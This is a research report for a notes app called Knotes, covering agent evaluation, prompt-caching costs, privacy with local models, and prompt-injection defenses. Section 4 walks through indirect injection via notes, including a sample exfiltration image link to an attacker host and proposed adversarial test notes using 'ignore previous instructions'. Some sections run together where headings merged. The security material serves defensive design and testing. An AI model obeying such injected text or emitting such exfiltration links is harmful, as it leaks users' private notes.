# Evaluation, cost/latency control, privacy and local models, and agent-tool security for AI over personal notes (state as of 2026-11-14)

Scope note: findings come from primary docs fetched on 2026-11-14 unless marked. "Older" marks material published before 2026. "Third-party" marks claims from non-vendor write-ups. OpenAI docs now live at developers.openai.com. platform.openai.com/docs redirects there (301).

## 1. RAG/agent evaluation: metrics, judges, variance, CI gating, and a cheap grader for Knotes' 30 questions

### Takeaway
Current practice (Anthropic, Jan 2026) is a small task bank of 20–50 cases built from real failures. Each case is graded by deterministic checks where possible and by an isolated, rubric-based LLM judge (calibrated against a human) where not. Each task runs several times, reported as pass@k or pass^k with standard errors and paired comparisons. With 30 questions, single runs cannot detect 5–10 pp changes: 5 runs per question plus paired analysis gets Knotes to roughly 15 pp resolution, and finer resolution needs more questions. Hosted OpenAI graders are being deprecated, so the grader should be local code that calls the same Responses API.

### Cited Findings
**Task bank and graders (Anthropic, "Demystifying evals for AI agents", 2026-01-09)**
- Start with about 20–50 tasks drawn from real failures. Hundreds aren't needed. Seed them from the manual checks you already run, bug trackers and support tickets — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)
- A good task is one where two domain experts would reach the same pass/fail verdict. Write a reference solution for each task to prove it is solvable and the grader works. If a task scores 0% over many trials, suspect the task or grader first — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)
- There are three grader types. Code-based graders (string match, state checks, tool-call checks) are fast, cheap and reproducible but brittle. Model-based graders (rubric, pairwise, reference-based) are flexible but non-deterministic and need calibration against humans. Human graders are the gold standard and are used mainly to calibrate model graders. Combine them — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)
- "Grade what the agent produced, not the exact path it took." Rigid step-order checks punish valid solutions. Give partial credit on multi-part tasks — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)
- For LLM judges: use structured rubrics, grade each dimension with a separate isolated judge, give the judge an escape option such as "Unknown" to reduce hallucinated grades, and calibrate against human experts — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)
- Test both cases where a behavior should happen and cases where it shouldn't, to avoid one-sided optimization — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)
- pass@k is the chance of at least one success in k tries. pass^k is the chance that all k succeed and is the right metric when consistency matters, as in user-facing agents. Example: a 75% per-trial rate gives pass^3 = 0.75³ ≈ 42% — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)
- Capability evals start at a low pass rate. Regression evals should sit near 100%. Promote capability tasks to the regression suite once they pass consistently. Retire or harden saturated evals — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)
- Read transcripts from many trials to separate agent mistakes from grader bugs. Example: Opus 4.5 went from 42% to about 95% on CORE-Bench after grading and task bugs were fixed — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)
- Run automated evals on every agent change and model upgrade. Track latency, tokens, cost and error rates on a static task bank as baselines — [Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)

**Statistics for variance (Anthropic, "A statistical approach to model evaluations", 2024-11-19, older)**
- Report the standard error of the mean. The 95% CI is mean ± 1.96 × SEM — [Anthropic](https://www.anthropic.com/research/statistical-approach-to-model-evals) / paper [arXiv:2411.00640](https://arxiv.org/abs/2411.00640)
- Cluster standard errors when questions share a unit. Clustered SEs on popular evals came out more than 3× larger than naive ones — [Anthropic](https://www.anthropic.com/research/statistical-approach-to-model-evals)
- Reduce within-question variance by sampling several answers per question and averaging before computing SEM (Inspect's "epochs") — [Anthropic](https://www.anthropic.com/research/statistical-approach-to-model-evals)
- Use paired-difference tests when comparing two configurations on the same questions. This removes question-difficulty variance. The per-question correlation between frontier models was 0.3–0.7 — [Anthropic](https://www.anthropic.com/research/statistical-approach-to-model-evals)
- Do a power analysis before choosing eval size: fix the effect size you care about, the significance level and the power, then compute the number of questions needed — [Anthropic](https://www.anthropic.com/research/statistical-approach-to-model-evals)

**LLM-as-judge biases (older, 2023)**
- MT-Bench / Chatbot Arena paper: LLM judges show position bias, verbosity bias, self-enhancement bias and limited reasoning ability. Strong judges such as GPT-4 reach "over 80% agreement" with human preferences, the same level as agreement between humans — [Zheng et al., arXiv:2306.05685](https://arxiv.org/abs/2306.05685)

**RAGAS metric definitions (docs.ragas.io, current)**
- The metric catalog covers RAG (Context Precision, Context Recall, Context Entities Recall, Noise Sensitivity, Response Relevancy, Faithfulness), agents (Topic Adherence, Tool Call Accuracy, Tool Call F1, Agent Goal Accuracy), natural-language comparison (Factual Correctness, Semantic Similarity, Exact Match, etc.) and general purpose (AspectCritic, Simple Criteria Scoring, Rubrics-based Scoring, Instance-specific Rubrics Scoring) — [RAGAS metrics list](https://docs.ragas.io/en/stable/concepts/metrics/available_metrics/)
- Faithfulness = (claims in the response supported by the retrieved context) / (total claims). Inputs are user_input, response and retrieved_contexts, with no reference needed. The verifier can be swapped for Vectara HHEM-2.1-Open, a small free T5 classifier that runs on CPU. The legacy API is deprecated in 0.4 and removed in 1.0 — [RAGAS Faithfulness](https://docs.ragas.io/en/stable/concepts/metrics/available_metrics/faithfulness/)
- Context Precision@K = Σ_k (Precision@k × v_k) / (number of relevant items in the top K), a rank-weighted precision. Variants: reference-based LLM judging, reference-free (judged against the response), non-LLM (string similarity to reference contexts) and **ID-based** (retrieved IDs ∩ reference IDs / retrieved IDs) — [RAGAS Context Precision](https://docs.ragas.io/en/stable/concepts/metrics/available_metrics/context_precision/)

**TruLens / DeepEval (mostly third-party summaries)**
- The TruLens "RAG triad" (2023) consists of context relevance, groundedness and answer relevance, and is reference-free. Low context relevance points to chunking or retrieval problems. Low groundedness points to the generator — [DeepLearning.AI course lesson](https://learn.deeplearning.ai/courses/building-evaluating-advanced-rag/lesson/lawtd/rag-triad-of-metrics); [JavaPro (third-party)](https://javapro.io/2025/05/14/evaluating-rag-pipelines-with-the-rag-triad/); OWASP also recommends evaluating responses with the RAG triad as an injection mitigation — [OWASP LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- DeepEval is open source, integrates natively with Pytest for CI, and offers G-Eval, a custom-criteria judge that uses chain-of-thought steps, from the G-Eval paper (EMNLP 2023) — [Atlan comparison (third-party)](https://atlan.com/know/llm-evaluation-frameworks-compared/); [Comet blog (third-party)](https://www.comet.com/site/blog/rag-evaluation/)

**OpenAI graders (developers.openai.com, current)**
- **Deprecation:** "OpenAI is deprecating graders as part of the evals and fine-tuning workflows they support" — [OpenAI Graders](https://developers.openai.com/api/docs/guides/graders)
- The design is still a useful template. Grader types: string_check (eq, neq, like, ilike), text_similarity (fuzzy_match, bleu, rouge, cosine), score_model (judge prompt with `{{item.reference_answer}}` and `{{sample.output_text}}`, a `range`, a `pass_threshold`, and output of a `result` float plus `steps` with description and conclusion) and python grade(sample, item) — [OpenAI Graders](https://developers.openai.com/api/docs/guides/graders)
- OpenAI's rubric guidance: detailed step-by-step instructions with few-shot examples of good, fair and poor answers. Build a small human-graded set and check that the grader ranks answers in the same order as experts. Run several candidates to check stability. Avoid skewed label distributions — [OpenAI Graders](https://developers.openai.com/api/docs/guides/graders)

**Apple's own tooling (WWDC26)**
- Apple now ships an evaluation toolkit for Foundation Models: a configurable "model judge evaluator", a "Compare" view across configurations on the same dataset, and synthetic expansion of a small curated set — [WWDC26 session 8121 (Group Lab)](https://developer.apple.com/videos/play/wwdc2026/8121/)

### Inferences
- **Statistical resolution of Knotes' 30-question run (my calculation, not from a source).** With binary pass/fail, n=30 and p≈0.8, SEM = √(0.16/30) ≈ 0.073, so the 95% CI is about ±14 pp. A single run cannot detect a 5–10 pp change. For a paired comparison (old vs new prompt on the same 30 questions, 5 runs each, per-question pass rates averaged), assume an SD of the per-question difference of about 0.3. The minimum detectable effect at α=0.05 with 80% power is ≈ 2.8 × 0.3 / √30 ≈ 15 pp. Detecting 10 pp needs about 70 questions, and 5 pp about 280. Options: (a) accept about 15 pp resolution for the end-to-end run and rely on the offline retrieval benchmark (46 queries, 3 s, deterministic) for fine-grained retrieval changes, (b) grow the golden set from real chat logs toward 60–100 questions, (c) use continuous judge scores (0–4 rubric) instead of pass/fail, which lowers variance.
- **Knotes already has the right two-layer shape:** a deterministic retrieval layer (Recall@5/MRR) and an end-to-end layer. Per RAGAS, the retrieval layer can add **ID-based context precision/recall** on note IDs actually returned by the agent's tool calls in the live run. This is free and deterministic, and it reveals whether a bad answer came from retrieval or generation (the triad logic).
- **A cheap automated grader for the 30 questions (proposed design, built from the cited guidance):**
  1. For each question, store in the golden file: `expected_notes` (paths), `must_include` facts (2–5 short atomic claims), `must_not` claims (known wrong answers or hallucination traps), and a free-text `reference_answer`. Include some "should refuse or say not found" questions, per Anthropic's both-sides advice.
  2. Use deterministic checks first, in Rust and free. Did the agent open or search any `expected_notes` (ID-based recall)? Does the answer cite or link existing notes, with link targets that exist in the vault? Count tool calls, tokens, latency and cache hit ratio from `usage`.
  3. Then the LLM judge: one call per answer through the same Responses API (plan-funded) with a fixed rubric. Score each `must_include` claim as supported, partial or missing. Flag any `must_not` claim present. Check faithfulness: for every claim in the answer, is it supported by the tool outputs the agent saw (RAGAS-style claim decomposition)? Return JSON with `{per_claim[], unsupported_claims[], score 0–4, verdict pass|fail|unknown}`. Isolate dimensions (correctness vs faithfulness) into separate judge calls if budget allows. Give the judge the reference, never the agent's reasoning. Use a different reasoning effort or model from the agent where possible, to soften self-enhancement bias.
  4. Calibrate once by hand-grading the existing 30 Markdown runs. Measure judge–human agreement and fix the rubric until it is ≥ 80% (the MT-Bench level). Re-check whenever the model changes.
  5. Run k=3–5 trials per question at night or on demand, not on every commit (cost). Report the mean judge score with 95% CI, pass@k and pass^k (consistency is what users feel), and paired deltas against the last baseline. Gate only on the deterministic retrieval benchmark in `cargo test`. Treat the end-to-end eval as a regression report that flags "the CI lower bound fell below the baseline".
- Pairwise grading ("is answer A or B better for this question?", presented in both orders to cancel position bias) works well for prompt-change A/B tests on overview questions where no single reference exists.
- Since OpenAI hosted graders are deprecated and Knotes requests are plan-funded, a local Rust or Python harness is the durable path. Inspect's "epochs" concept is the model to copy.

## 2. Cost and latency: prompt caching, reasoning effort, streaming, parallel tools, smaller models, ChatGPT-plan limits

### Takeaway
On OpenAI, cache hits need an exactly identical prefix. That prefix includes tool definitions, `reasoning.effort`, `text.verbosity` and `parallel_tool_calls`, so changing any of these mid-conversation, or editing or truncating history, kills reuse. Cached reads cost 0.1× input, and on GPT-5.6+ cache writes cost 1.25×. Lower reasoning effort, fewer output tokens and parallel lookups are OpenAI's main latency levers. For Sign in with ChatGPT apps, usage comes from the shared Work/Codex pool. Third-party write-ups report that requests must be `store:false` and `stream:true`, that Plus has a shared 5-hour window across connected apps, and that users can cap each app weekly.

### Cited Findings
**Prompt caching (developers.openai.com, current; references GPT-5.5, 5.6, 6.x)**
- Caching is on by default. Cached input is "discounted up to 95%". It also reduces time to first token — [OpenAI Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)
- Minimum prefix: 1,024 tokens for GPT-5.6+. GPT-5.5 places implicit breakpoints every 2,048 tokens. Earlier models use model-dependent intervals. On ≤5.5, `cached_tokens` is rounded down to a multiple of 128 — [OpenAI Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)
- Billing on GPT-5.6+: cache write = 1.25× input (default 30-minute TTL) or 2.5× (12 h, Responses only). Cache read = 0.1× input, or 0.05× for GPT-6.1 Sol/Terra. Each token is billed at exactly one rate — [OpenAI Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)
- Explicit mode on GPT-5.6+: up to 4 `prompt_cache_breakpoint`s per request. Implicit mode puts a breakpoint at the end of the latest eligible message (user message, last tool response in a group, etc.) — [OpenAI Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)
- Routing: caches are per machine. Above about 15 requests per minute per prefix+key, overflow routing may miss. Before GPT-5.6, keep related requests on a stable `prompt_cache_key`. On 5.6+, routing is automatic and the key is mainly for per-user cache accounting, which also helps prevent cache-hit probing — [OpenAI Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)
- Retention: `prompt_cache_retention` = `in_memory` (5–10 min idle, up to 1 h) or `24h` on earlier models, where GPT-5.5 supports only `24h` and non-ZDR orgs default to `24h`. On 5.6+, `prompt_cache_options.ttl` = `30m` (default) or `12h` — [OpenAI Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)
- What breaks the cache: changing the model, `tools` (names, descriptions, schemas, order), `parallel_tool_calls`, `text.format`, `reasoning.effort`, `text.verbosity` or `context_management` (compaction). Editing, truncating or summarizing earlier messages. Placing dynamic content (timestamps, user data) before static content — [OpenAI Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)
- Recommendations: stable instructions and tools first, dynamic content last. Append, don't rewrite, history. Keep the tool list fixed and use `tool_choice:"none"` or `allowed_tools` instead of removing tools. `prompt_cache_options.prewarm` can cache shared context before the first user turn. On GPT-6, a `configuration_update` item changes reasoning effort without altering the prefix — [OpenAI Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)
- Usage fields: `usage.input_tokens_details.cached_tokens` (reads) and `cache_write_tokens`. Uncached input = input − cached − writes. Cached tokens still count toward TPM rate limits. The cache stores encrypted KV tensors (not text) for at most 24 h and is ZDR-compatible — [OpenAI Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)

**Reasoning effort and tokens (developers.openai.com, current)**
- Effort values are `none`, `minimal`, `low`, `medium`, `high`, `xhigh` and `max`, with per-model subsets. GPT-5.5, GPT-5.6, GPT-6.1 Sol, GPT-6 Sol and GPT-6 Luna default to `medium`. GPT-6.1 Sol does not support `none` or `minimal` — [OpenAI Reasoning](https://developers.openai.com/api/docs/guides/reasoning)
- OpenAI suggests `low` for tool use, planning, search and data analysis, and `none` for latency-critical work such as fast retrieval and classification. For latency-sensitive gpt-5.5, try `low` first — [OpenAI Reasoning](https://developers.openai.com/api/docs/guides/reasoning)
- Reasoning tokens are billed as output and occupy context. `max_output_tokens` caps reasoning plus visible output and can yield an `incomplete` response with no text. OpenAI recommends reserving at least 25,000 tokens for reasoning and output — [OpenAI Reasoning](https://developers.openai.com/api/docs/guides/reasoning)
- With `store:false`, reasoning items carry `encrypted_content` by default, and the `include` flag is now legacy. Pass reasoning items back with tool outputs so the model keeps reasoning across tool calls. `reasoning.context` = `auto|current_turn|all_turns`, where the GPT-5.6 family defaults to `all_turns` and earlier models to `current_turn` — [OpenAI Reasoning](https://developers.openai.com/api/docs/guides/reasoning)

**Latency playbook (developers.openai.com, current)**
- Seven principles: process tokens faster (fastest model that passes quality), generate fewer tokens (lower `text.verbosity` and `reasoning.effort`, compute known values in code), use fewer input tokens (filter search results, strip markup, stable prefix), make fewer requests, parallelize independent lookups, stream (`stream:true`) and show real progress, and don't default to an LLM (render known data directly) — [OpenAI Latency optimization](https://developers.openai.com/api/docs/guides/latency-optimization)
- Measure p50/p95 of time to first token (TTFT) and end-to-end latency per model, tier and task, alongside input, cached and output tokens. Compare TTFT with and without cache hits. OpenAI names `gpt-6-luna` as a small model for focused tasks such as routing — [OpenAI Latency optimization](https://developers.openai.com/api/docs/guides/latency-optimization)

**ChatGPT plan / Codex usage and Sign in with ChatGPT**

Estimated local messages per 5 h for Plus: GPT-6 Astra 5–45, GPT-6.1 Sol 15–160, GPT-6.1 Terra 35–285, GPT-6 Luna 350–3,000. Weekly limits may also apply. Pro currently has no 5-hour limit. - GPT-5.5 retires from Codex with ChatGPT sign-in on 2026-10-14 — [ChatGPT/Codex pricing](https://learn.chatgpt.com/docs/pricing)
- Plan usage in third-party apps ("Sign in with ChatGPT") was announced at DevDay on 2026-09-29 with 16 launch partners. ### Inferences
- **Cache discipline is the biggest cost lever for Knotes.** The system prompt, tool schemas, `reasoning.effort`, `verbosity` and `parallel_tool_calls` must be byte-stable for a whole conversation. Today's date, recent-notes list or task list (the latest commit puts "recent notes beside the task list" in context) must go **after** the stable prefix, ideally in the first user turn rather than in the instructions, or the prefix changes daily or per open note. Never switch effort mid-conversation, or the cache is lost. If adaptive effort is wanted, choose it per conversation at turn 1. Verify with a test that hashes the serialized prefix of turn N and turn N+1.
- Log `cached_tokens / input_tokens` per request in the eval Markdown. The 30-question run should report cache hit ratio and TTFT alongside total time. If a 2–10k-token answer shows a low ratio on turn 2+, something in the prefix is moving.
- **Plan accounting (inference):** the Codex credit table prices cached input at 1/10–1/20 of fresh input, which suggests plan usage is also consumed more slowly by cached tokens. This is not confirmed for Sign in with ChatGPT usage accounting.
- **Tool-output trimming:** OpenAI's "filter search results, strip markup" advice and the cache rules imply that search tools should return compact snippets (title, path, heading, about 300 characters around the hit) rather than whole notes, with a separate `read_note` for full text. Do not summarize or truncate older turns, because that breaks the cache. Instead cap what each tool returns.
- **Reasoning effort:** start the chat agent at `low` (OpenAI's suggestion for tool use and search). Escalate to `medium` only for overview or synthesis questions, decided at conversation start. Measure with the 30-question harness, since effort is exactly the kind of change needing the paired, multi-run design from section 1.
- **Smaller models for sub-tasks:** query expansion, title or summary generation, and note-relevance filtering ("map" step) can use a small model (Luna-class, or on-device Apple FM, see section 3), keeping the main model's prefix stable.
- **Streaming and perceived latency:** plan-funded requests must stream anyway. Showing tool-call progress ("searching for X…", "reading 3 notes") per OpenAI's "show real progress" principle cuts perceived latency for the 55-second overview questions.
- **Handle the ambiguous 429** in UI: tell the user that plan usage for Knotes may be capped (per-app cap, 5-hour window or weekly limit) and point them to ChatGPT Settings > Usage.
- **Inference to verify:** if the reported ban on `max_output_tokens` and `system` role holds, Knotes must use `developer`/`instructions` rather than a system message and can't cap output length by parameter, only by prompt and verbosity.

## 3. Privacy: what leaves the device, exclusions, local models (Apple Foundation Models, Ollama/MLX), local embeddings

### Takeaway
Leading tools treat exclusions as a retrieval preference rather than a security boundary (Obsidian Copilot says so explicitly). Notion relies on permissions, zero data retention (ZDR) and no-training contracts instead of per-page exclusions. For a fully local private mode on a Mac, the realistic options as of Nov 2026 are: Apple's on-device Foundation Models model (~3B, 4,096-token context shared by input and output, tool calling and guided generation, no per-call cost), Apple's Private Cloud Compute (PCC) model (32K context, newly reachable in the 27 betas), or Ollama/LM Studio models such as gpt-oss-20b (16 GB RAM) and local embedding models (qwen3-embedding, bge-m3, embeddinggemma). The on-device Apple model is too small in context for agentic Q&A over many notes, but it fits sub-tasks.

### Cited Findings
**Obsidian Copilot (current docs)**
- Indexing and semantic search now run through "Miyo", a local-first search service. A local connection keeps requests on the computer, while a remote connection sends them to the address entered. On first registration, Copilot passes Obsidian's ignored paths as the folder's initial Miyo exclusions — [Copilot Settings](https://docs.obsidiancopilot.com/settings/)
- "Scope is a retrieval preference, not an authorization boundary." Copilot applies inclusion and exclusion rules to Miyo results used for chat — [Copilot Settings](https://docs.obsidiancopilot.com/settings/)
- "Self-Host Mode" sorts local options first and warns about cloud options, but "is not a firewall". "Auto-attach active note" can be turned off. The agent activity log can contain prompts, note contents and tool outputs, is stored on-device outside the vault, and can be disabled. Ollama (`localhost:11434/v1`) and LM Studio (`localhost:1234/v1`) are BYOK chat providers — [Copilot Settings](https://docs.obsidiancopilot.com/settings/)
- Third-party summaries: the official Copilot stores keys in the device's Obsidian Keychain rather than in vault data.json, and can run with a local model. No tag-based "never send" setting was found for the official plugin — [obsidianstats listing (third-party)](https://obsidianstats.com/plugins/copilot)
- Other plugins: Vault Copilot documents folder exclusion "to prevent access to private notes" and tags for sensitive content — [Vault Copilot context control (third-party plugin docs)](https://danielshue.github.io/vault-copilot-extensions/features/context-control)

**Notion AI (current help page, © 2026)**
- Notion AI uses only content the user can already access and never widens access. Permissions apply at both search and generation. On Enterprise, "most models we use offer ZDR", and non-ZDR models are off by default and need owner opt-in. On Free, Plus and Business, providers retain data ≤30 days. There is no training on customer data by default. Embeddings are deleted within 60 days of page deletion. The vector DB is Turbopuffer. No per-page or per-workspace exclusion setting is described — [Notion AI security practices](https://www.notion.com/help/notion-ai-security-practices)

**Apple Foundation Models**
- On-device model: about 3B parameters, 2-bit quantization-aware training, KV-cache sharing. The server model is a PT-MoE running on Private Cloud Compute. Both models handle tool calls and multiple languages. The framework offers guided generation, constrained tool calling and LoRA adapters. ### Inferences
- **What leaves the device in Knotes today:** the system prompt, the user's question, and every tool output (note snippets, recent-notes list, task list) go to OpenAI under `store:false`. A Privacy panel listing exactly which context blocks are sent per turn (Knotes already logs them) would match the transparency norm. Copilot exposes its activity log, and Apple asks developers to "surface those boundaries" for third-party models.
- **Exclusions — what to build:** (1) a folder or glob exclusion list plus a frontmatter flag (`ai: false` or a `#private` tag) that the **tool layer** enforces. Excluded notes are never returned by search, read or backlink tools, and their links are shown as "[excluded]". Enforcement belongs in Rust tool code, not in the prompt. (2) Unlike Copilot ("not an authorization boundary"), Knotes can make this a hard boundary because it owns the tool layer. That is a differentiator, and it must be tested: a unit test that each tool filters excluded paths, plus an eval question about an excluded note expecting "not found". (3) Respect `.obsidian` ignored paths by default, as Copilot does via Miyo.
- **Private mode on M1 (inference):** the Apple on-device model (4,096 tokens shared) cannot hold a multi-note agent loop at Knotes' typical 2–10k tokens per answer. It suits on-device sub-tasks such as query rewriting, date parsing, title or summary generation, relevance yes/no filtering (LLM map-reduce), and classifying whether a question needs notes. PCC (32K) could run a lighter private agent, but quotas and pricing for third-party apps are undocumented. For a true local agent, gpt-oss-20b via Ollama is the closest to the OpenAI tool-calling style, but needs 16 GB RAM, which is borderline on an 8–16 GB M1. Earlier v1 measurements found mlx-vlm about 2× slower than Ollama.
- Local embeddings (bge-m3 or qwen3-embedding-0.6B multilingual, important for Ukrainian notes) would let semantic search stay fully on-device and complement FTS5. Note-text then never leaves the device for retrieval, only for the final answer.
- Apple's "phone a friend" pattern maps onto Knotes: when escalating from local to cloud, send only the current question plus minimal snippets, not the whole local transcript.

## 4. Security of agent tools over notes: prompt injection via note content, mitigations for read-only and future write tools, MCP guidance

### Takeaway
Indirect prompt injection through retrieved documents is OWASP's #1 LLM risk (LLM01:2025), and no filter reliably stops it. The accepted defense is architectural: avoid the "lethal trifecta" of private data, untrusted content and an exfiltration channel, and apply design patterns (plan-then-execute, dual LLM, map-reduce, context minimization) so that untrusted text cannot trigger consequential actions. Write tools need human approval, least privilege, diffs and undo. Knotes' MCP server should follow the MCP spec's local-server guidance (stdio, or authenticated restricted IPC).

### Cited Findings
- OWASP LLM01:2025 defines indirect injection as instructions arriving via external content such as "websites or files". Scenario #4 is RAG document poisoning. Scenario #2 is hidden text that makes the LLM insert an image link, leaking the conversation. Scenario #7 is a prompt hidden in an image. Scenario #9 is obfuscation via Base64, emoji or multiple languages — [OWASP LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- OWASP's mitigations: (1) constrain model behavior in the system prompt, (2) define and validate output formats with deterministic code, (3) filter input and output, including RAG-triad evaluation, (4) least privilege, with functions handled in code, (5) human approval for high-risk actions, (6) segregate and clearly mark untrusted external content, (7) adversarial testing that treats the model as an untrusted user — [OWASP LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- The lethal trifecta is access to private data, exposure to untrusted content and the ability to communicate externally. Any tool that can "make an HTTP request, load an image, or provide a link for a user to click" can exfiltrate. On guardrails: "in web application security 95% is very much a failing grade". "We still don't know how to 100% reliably prevent this" (2025-06-16, older) — [Simon Willison](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)
- Design patterns paper (Beurer-Kellner et al., June 2025, older): "once an LLM agent has ingested untrusted input, it must be constrained so that it is impossible for that input to trigger any consequential actions" — [arXiv:2506.08837](https://arxiv.org/abs/2506.08837)
- The six patterns, as summarized by Willison: Action-Selector (the agent never sees tool outputs), Plan-Then-Execute (actions fixed before untrusted content is read), LLM Map-Reduce (sub-agents process untrusted docs and return constrained outputs such as booleans), Dual LLM (a privileged LLM handles symbolic variables from a quarantined one), Code-Then-Execute (CaMeL-style DSL with taint tracking) and Context-Minimization — [Simon Willison on the paper](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)
- MCP security best practices: a local MCP server compromise can lead to arbitrary code execution, data exfiltration or data loss. Clients offering one-click local server setup MUST show the exact command and require explicit consent, and SHOULD sandbox. Servers meant to run locally SHOULD use the stdio transport, or if using HTTP, require an auth token or use Unix domain sockets or restricted IPC. Scope minimization: start with low-risk read scopes and elevate incrementally. Do not pass through tokens — [MCP Security Best Practices (draft spec)](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
- MCP also forbids treating possession of a state handle as authentication. Handles should be random and bound to the user — [MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
- Obsidian Copilot's agent permission model: Safe, Plan (approve a plan before edits) and Auto modes. A "Permission required" card offers allow or deny once, or "always" with a visible scope. Saved rules can be reviewed and removed. A "Files changed" card shows per-note diffs, with Revoke and Revoke-all. Copilot warns that "your vault … is the agent's working directory, not a security sandbox" and that changes by shell commands aren't listed. Its docs do not mention prompt injection — [Copilot Agent mode & tools](https://docs.obsidiancopilot.com/agent-mode-and-tools/)
- Apple's handoff guidance: use "phone a friend" (an ephemeral session with only the current question) when passing to a less-trusted model, and developers must surface third-party data-handling boundaries — [WWDC26 session 8121](https://developer.apple.com/videos/play/wwdc2026/8121/)

### Inferences
- **Knotes' trifecta check:** private data (the vault) is present, and untrusted content is present (web clippings, PDFs, imported notes, shared folders, git-pulled notes). The **exfiltration channel** is the part to control. If the chat renders Markdown images or auto-fetches remote URLs from model output, a malicious note can make the model emit `![](https://attacker/?q=<secret>)`. Mitigations: do not auto-load remote images in chat answers (render as links, or proxy only after a click). Do not auto-follow links. Keep any future "web fetch" tool separate from vault-reading tools, or require a confirmation per URL.
- **Read-only tools today:** wrap tool outputs in clearly delimited, typed blocks (for example, `<note path=… untrusted>`) and state in the instructions that note text is data, not instructions (OWASP #1 and #6). Show provenance in the UI: every answer claim links to the notes and lines used, which is also needed for the faithfulness grader. Add 3–5 adversarial notes to the eval golden set ("ignore previous instructions and…", hidden HTML comments, Base64) and expect the agent to answer normally (OWASP #7).
- **Future write tools** (create or edit notes, tasks): plan-then-execute or approval by default. The model proposes a diff, and the user confirms with Accept/Reject and an undo stack, as in Copilot's diff/Revoke and OWASP #5. Use a small allowlist of write operations (append to a daily note, toggle a task) with parameters validated in Rust. Never allow writes to paths outside the vault or to excluded folders. Do not let a write tool and a network tool both act in one turn without confirmation. Log every write with the triggering conversation turn, and record git commits per AI change (Knotes already has git).
- **Knotes MCP server:** stdio by default per the MCP spec. If an HTTP or socket transport exists for other clients, require a token or a Unix socket with user-only permissions. Expose read-only tools by default and gate writes behind a separate scope or setting. Apply the same exclusion filter in MCP tools as in the in-app chat, because external clients (Gemini, agy) are also LLMs exposed to note content.
- Map-reduce fits overview questions: summarizing many notes with constrained per-note outputs (relevant yes/no plus a short extract) limits how much one poisoned note can steer the final answer, and also cuts tokens and latency.

- MCP "tool poisoning" (malicious tool descriptions) is not covered in the MCP best-practices page fetched. Coverage would need other sources, such as vendor security blogs, which were not fetched.
